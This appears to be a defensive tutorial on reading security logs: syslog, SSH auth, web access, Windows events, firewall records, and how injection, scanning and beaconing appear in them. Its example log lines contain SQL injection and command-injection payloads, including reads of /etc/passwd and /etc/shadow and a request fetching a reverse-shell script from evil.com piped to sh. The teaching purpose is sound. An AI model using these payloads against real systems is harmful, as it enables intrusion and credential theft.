# Log Analysis Fundamentals

## Anatomy of a log

### Core Concept: The Four Pillars of Logging

Every useful log entry must answer four critical questions:
- When did it happen? (Timestamp & Timezone)
- Who did it? (User, Process, or Service)
- Where did it come from? (Source IP, Hostname)
- What happened? (The actual event or error)

### Technical Overview: Common Log Formats

1. Syslog (RFC 5424)
`Nov  3 14:22:05 db-server-01 mysqld[3921]: Query timed out after 30s for user analytics_report.`
Breakdown:
- Nov 3 14:22:05 - The timestamp. Notice the year is missing! In Syslog short format, you must always assume the current year.
- db-server-01 - The Hostname.
- mysqld[3921] - The Process and Process ID (PID).
- Query timed out... - The Message body.

2. Apache/Nginx Combined Format
`192.168.10.5 - - [03/Nov/2025:14:22:05 -0500] "GET /admin/config HTTP/1.1" 403 532`
Breakdown:
- 192.168.10.5 - Source IP.
- "-" (First Dash) - The ident field (rarely used, usually a dash).
- "-" (Second Dash) - The Authenticated User. If you see a dash here, it indicates no authenticated user was present for this request.
- [03/Nov/2025...] - Timestamp with timezone offset.
- "GET ..." - The HTTP Request, followed by Status Code (403) and Bytes sent (532).

3. JSON Structured Logs
{
  "timestamp": "2025-11-03T08:15:00Z",
  "level": "INFO",
  "service": "auth",
  "ip": "10.0.0.45",
  "message": "Login successful"
}

Analyst Trap: Novice analysts often see "message": "Login successful" and assume the user is legitimate. This is a trap! A successful login is just the start of the investigation, not proof of legitimate intent. An attacker using stolen credentials will also generate a "Login successful" log!


### Analytical Workflow: Dealing with Timestamps

Golden Rule of Timestamps: Always, ALWAYS check the timezone before drawing conclusions!

- ISO 8601 (2025-11-03T14:22:05Z): The Z stands for Zulu time (UTC). This is the best-case scenario.
- Epoch (1730658125): Seconds since Jan 1, 1970. Never guess these—use a converter tool.
- Syslog Short (Nov 3 14:22:05): As mentioned, if the year is missing, it implies the current year.

###  Field Fact: Log Severity Levels

Logs are usually tagged with a severity level:
- DEBUG/INFO: Normal operations. Great for tracing steps, but often noisy.
- WARN: Something unexpected happened, but the system recovered.
- ERROR/FATAL: Something broke.

During an incident, INFO logs (like login events) become your best friends for building a timeline of the attacker's lateral movement.

## SSH Authentication

SSH is the front door to every Linux server you will ever manage. And just like a real front door in a bad neighborhood, it gets hammered by attackers constantly. If you know what to look for in auth.log, you can spot a brute force attack, a compromised credential, or lateral movement within seconds.

### Core Concept: Where SSH Logs Live and How They Look

On Debian/Ubuntu systems, SSH authentication events go to /var/log/auth.log.
On RHEL/CentOS, they go to /var/log/secure.

A typical successful key-based login produces multiple lines:
`Nov  3 14:22:05 web-server-01 sshd[4821]: Accepted publickey for alice from 10.0.0.15 port 44832 ssh2: RSA SHA256:abc123def456
Nov  3 14:22:05 web-server-01 sshd[4821]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
`

The first line is the SSH daemon (sshd) confirming the key was accepted. The second is PAM confirming the session started. In an investigation, the sshd line is your best friend because it has the source IP and username.

### Technical Overview: Anatomy of a Failed Login

Failed logins look like this:
`Nov  3 14:22:10 web-server-01 sshd[4825]: Failed password for invalid user administrator from 203.0.113.77 port 52314 ssh2`

The key phrase here is "invalid user." This means the username does not exist on the system. If it just said "Failed password for admin" without "invalid user", that would mean the username does exist, but the password was wrong.

Analyst Trap - Coinciding Events: Imagine you see "Failed password for invalid user deploy from 203.0.113.77" followed immediately by "Accepted public key for deploy from 10.0.0.15". What happened? An external IP tried a password spray while a legitimate user logged in with a key from an internal IP. Don't mix up the two distinct source IPs!

### Analytical Workflow: Spotting and Handling Brute Force

A brute force attack is not subtle. You will see the same source IP hitting the same service repeatedly.

To count attempts from a single IP quickly, use this command:
`grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head`

If the output shows 4872 203.0.113.77, your instinct might be to block it immediately. Stop. The immediate next step must ALWAYS be to check whether any "Accepted" entries exist from that same IP before blocking it. Blocking the IP doesn't kick them out if they already have an active session!

### Field Fact: Fail2ban and Timing

fail2ban is the single most effective defense against SSH brute force. It watches logs in real time and adds firewall rules to drop traffic from offending IPs.
`Nov  3 14:23:01 web-server-01 fail2ban.actions[1234]: NOTICE [sshd] Ban 203.0.113.77`

Incident Scenario: fail2ban logs a Ban for 203.0.113.77. But when investigating, you find an "Accepted publickey for admin" from that exact IP with a timestamp two minutes before the ban.

What is the severity? High severity because the attacker authenticated successfully before the ban was applied. A ban only stops future connections. If they got in two minutes prior, they are already inside.

## Web Access Logs

### Core Concept: The Combined Log Format

Apache and Nginx use what is called the Combined Log Format by default. Here is a real-looking entry from a production server:
`192.168.1.55 - alice [03/Nov/2025:14:22:05 -0500] "POST /api/login HTTP/1.1" 200 3841 "https://app.example.com" "Mozilla/5.0 (Windows NT 10.0)"`

Breakdown:
- 192.168.1.55 — Client IP address (where the request came from)
- "-" — Ident field (almost always a dash, ignore it)
- alice — Authenticated username (shows as dash if not logged in)
- [03/Nov/2025:14:22:05 -0500] — Timestamp with timezone offset
- "POST /api/login HTTP/1.1" — Request line containing method, path, and protocol
- 200 — HTTP status code
- 3841 — Response body size in bytes
- "https://app.example.com" — Referrer header (where the user came from)
- "Mozilla/5.0..." — User-Agent string (what software made the request)

### Technical Overview: Status Codes Tell You the Story

- 2xx (200, 201): Success. Most of your traffic should live here.
- 3xx (301, 302): Redirect. Usually benign, but a redirect to an external domain can indicate compromise.
- 4xx (400, 401, 403, 404): Client error. 401 means unauthorized, 403 means forbidden.
- 5xx (500, 502, 503): Server error.

Analyst Trap - The 500 Spike: Imagine you grep your access log for " 500 " and find a spike from 2 requests per hour to 847 in one hour, all from different IPs but all hitting /api/search. What is the most likely explanation? A vulnerability in the search endpoint is being exploited by multiple attackers simultaneously. 500 errors often indicate an injection attack broke your application logic.

### Analytical Workflow: Analyzing Anomalies

Let's look at a highly suspicious log entry:
`10.0.5.100 - - [03/Nov/2025:14:22:05 -0500] "GET /admin/dashboard HTTP/1.1" 403 532 "https://evil-phishing.com/landing" "Mozilla/5.0"`

There are exactly three red flags in this single line:

- The Referrer: It came from an external phishing domain.
- The Path: The request hits an administrative path (/admin/dashboard).
- The Status: The status is 403 Forbidden.

Attackers routinely spoof the Googlebot User-Agent to bypass poorly configured WAFs. If host <IP> returns a googlebot.com address, it's just Google indexing your site.
Must verify the IP resolves to a Google hostname using a reverse DNS lookup before escalating.

### Field Fact: Quick Filtering

When you have 500,000 lines of access log, you need to filter fast.
`grep " 403 " access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head`
That gives you the top IPs producing 403 errors. Replace 403 with 401 to find authentication failures.

## Windows Event Logs

### Core Concept: The Security Log and Event IDs

Windows stores security events in the Security log, viewable in Event Viewer or exported as EVTX files. These are the Event IDs you need to memorize:

- 4624 — Logon success (someone got in)
- 4625 — Logon failure (someone tried and failed)
- 4720 — User account created (possible persistence)
- 4732 — Member added to a local group (privilege escalation)
- 1102 — Audit log cleared (massive red flag)

### Technical Overview: Logon Types

Event 4624 tells you someone logged in, but the Logon Type field tells you how they logged in:

- Type 2 — Interactive (physically at the keyboard)
- Type 3 — Network (SMB share access)
- Type 10 — RemoteInteractive (RDP session, most critical for remote attacks)

Analyst Trap - The 3 AM Admin: You find Event ID 4624 with Logon Type 10 from source IP 10.0.5.23 at 3:17 AM for the administrator account. The normal admin team uses a jump server at 10.0.1.50. What is your assessment? It is highly suspicious because an RDP login from an unusual workstation at an unusual hour warrants immediate investigation. Don't assume an admin is just working late from a strange machine.

### Analytical Workflow: Detecting Account Persistence

Event 4720 is your early warning system for attacker persistence. When an attacker creates a new user account, they have a backdoor that survives password resets.

Always cross-reference 4720 (Account Created) with 4732 (Group Membership Change). Scenario: You discover Event ID 4720 showing a new account svc-backup was created, followed by Event 4732 adding it to the Domain Admins group 90 seconds later. Verdict: An attacker likely created a persistent backdoor account with administrative privileges. The 90-second gap means they moved fast and knew exactly what they wanted.

### Field Fact: The Log Clear Event

Event 1102 is the event you never want to see: "Audit log cleared." When an attacker clears the security log, they are actively destroying evidence.

Incident Scenario: Event 1102 appears showing "Audit log cleared" by CORP\administrator. The IT team confirms no scheduled maintenance was planned. What is your next step? Assume the admin account is compromised and check for other indicators of compromise from that account. Never assume it was a glitch or an accident.

## Detecting Web Attacks

### Core Concept: SQL Injection in Logs

Attackers often append SQL logic to URL parameters to manipulate the database. A common payload uses UNION SELECT to extract data.
`GET /api/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 8432`

Analyst Check: Your web access log shows the request above. The server returned 200. Is the application vulnerable? Verdict: Possibly, because a 200 response to a UNION SELECT payload means the query may have been processed, you need to check the response body. A 200 doesn't guarantee the data was leaked, but it means the server didn't outright reject the payload.

### Technical Overview: Blind SQL Injection

Sometimes attackers don't see error messages, so they ask true/false questions to the database.

Analyst Trap - The Invisible Extraction: An attacker is testing your application: `GET /api/user?id=1%27%20AND%201=1--` returns 200 with 234 bytes, and `GET /api/user?id=1%27%20AND%201=2--` returns 200 with 0 bytes. What attack technique is being used? Boolean-based blind SQL injection, extracting data by comparing response sizes. Since 1=1 is true and returns data, and 1=2 is false and returns no data, the attacker knows they can extract data bit by bit using true/false statements without ever seeing an explicit error message.

### Analytical Workflow: Spotting XSS

Scenario: You grep your access log for <script and find 47 matches from 12 different IPs, all hitting your search page. All return 200. What should you conclude? Verdict: Your search page is likely reflecting script tags back to users without sanitization, indicating a potential XSS vulnerability. A high volume of <script tags returning 200 means attackers are aggressively testing reflection points.

## Firewall & Network Logs

### Core Concept: Port Scanning

Scenario: Your firewall log shows 15 entries from source IP 198.51.100.23, all to different destination ports (21, 22, 23, 25, 80, 110, 135, 139, 443, 445, 993, 995, 1433, 3306, 3389) within 2 seconds. Verdict: A port scan is in progress, the attacker is mapping which services are running on your server. Such high-speed scanning across multiple ports is textbook Nmap or masscan behavior.

### Technical Overview: Malware Beaconing

Infected endpoints don't just sit quietly; they call home to Command and Control (C2) servers.

Analyst Trap - The Clockwork Connection: Your internal host 10.0.0.55 has been making HTTPS connections to 203.0.113.50 every 60 seconds for the past 3 days. All connections are allowed. The user on that workstation says they have never visited that site. What do you suspect? Malware on the workstation is beaconing to a command-and-control server at regular intervals. Human web browsing is random; exact 60-second intervals represent automated, programmatic check-ins.

### Analytical Workflow: Firewall Rule Tampering

Attackers who gain administrative access often alter firewall rules to maintain access.

Scenario: You see this sequence in your firewall logs: two BLOCK entries to port 22, followed by an ACCEPT to port 22 from the same IP 2 minutes later. What does this sequence suggest? Verdict: A firewall rule was changed or added to allow the attacker through after initial blocks. If traffic was definitively blocked and suddenly allowed without the source changing its behavior, the ruleset was compromised.

## Command Injection

### Core Concept: The Power of Semicolons

A semicolon `;` in Linux separates commands. In URLs, it is encoded as `%3B`.

Scenario: You find this in your web access log:
`GET /tools/dns.php?domain=8.8.8.8%3Bcat%20/etc/passwd HTTP/1.1" 200 2341`

The application is a DNS lookup tool. What does this mean? %3B is a semicolon, and the large response (2341 bytes) suggests the /etc/passwd file contents were returned to the attacker. The server essentially ran `nslookup 8.8.8.8; cat /etc/passwd`.

### Technical Overview: Post-Exploitation Recon

Analyst Trap - The Information Gathering Phase: An attacker is testing your web application for command injection. You see these requests in sequence:

- GET /api/lookup?host=127.0.0.1%3Bid
- GET /api/lookup?host=127.0.0.1%3Buname+-a
- GET /api/lookup?host=127.0.0.1%3Bcat+/etc/shadow What phase of the attack lifecycle is this? This is post-exploitation reconnaissance because the attacker is gathering system information after confirming command execution.

### Analytical Workflow: Backtick Execution

In Bash, backticks   execute the command inside them before the main command. In URLs, backticks are encoded as %60.

Scenario: Your web access log contains:
`GET /search?q=test%60curl+http://evil.com/rev.sh|sh%60 HTTP/1.1" 200 150`

The `%60` characters decode to backticks. What is the attacker trying to do? Verdict: The attacker is trying to download and execute a reverse shell script using backtick command substitution. Even if the parameter is just echoed back, the server processes the backticks first, downloading and piping the shell script to `sh`.

## Advanced Obfuscation

### Core Concept: PowerShell Encoded Commands

Malware heavily relies on PowerShell. To avoid antivirus, scripts are encoded.

Scenario: You find this PowerShell event log:
`powershell.exe -NoP -NonI -W Hidden -Enc aWV4IChOZXctT...`

What does -Enc indicate? The command after -Enc is base64-encoded and will be decoded and executed by PowerShell. Attackers use this to hide malicious scripts from basic string-matching detections.

### Technical Overview: Double URL Encoding

WAFs decode URLs once. If an attacker double-encodes a payload, the WAF sees harmless text, but the backend application decodes it a second time and executes it.

Scenario: Your web access log shows:
`GET /api/search?q=%2527%2520UNION%2520SELECT%25201,database()-- HTTP/1.1`

The `%25` sequences indicate double URL encoding. After one round of decoding, what would you see? Answer: `%27%20UNION%20SELECT%201,database()--` The `%25` decodes into `%`, reforming the actual single-round encoded SQL injection.

Analytical Workflow: Handling Heavy Obfuscation

Analyst Action Plan: An analyst is examining an obfuscated payload and sees high densities of %XX sequences in URL parameters, keywords like SELECT and UNION after partial decoding, and a base64 string over 200 characters in a search field. What is the best course of action? Decode the payload using CyberChef or command-line tools to reveal the full attack, then create detection rules for the decoded patterns. You cannot accurately assess the threat until you strip away every layer of obfuscation.